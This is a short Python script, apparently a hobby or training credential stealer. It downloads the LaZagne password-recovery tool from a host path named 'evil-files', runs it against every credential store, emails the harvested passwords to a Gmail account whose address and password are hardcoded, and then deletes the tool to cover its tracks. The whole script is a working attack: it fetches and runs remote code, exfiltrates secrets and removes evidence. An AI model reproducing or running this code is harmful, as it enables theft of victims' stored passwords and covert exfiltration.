#!usr/bin/env python
import requests,subprocess,smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    # writing files
    with open(file_name,"wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

# hide file to directory
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://192.168.0.34/evil-files/laZagne.py") #download the file
result = subprocess.check_output("laZagne.py all", shell=True)
send_mail("fraizerkilonzo@gmail.com", "Sandie@123", result ) #send the results
os.remove("laZagne.py") #delete the file
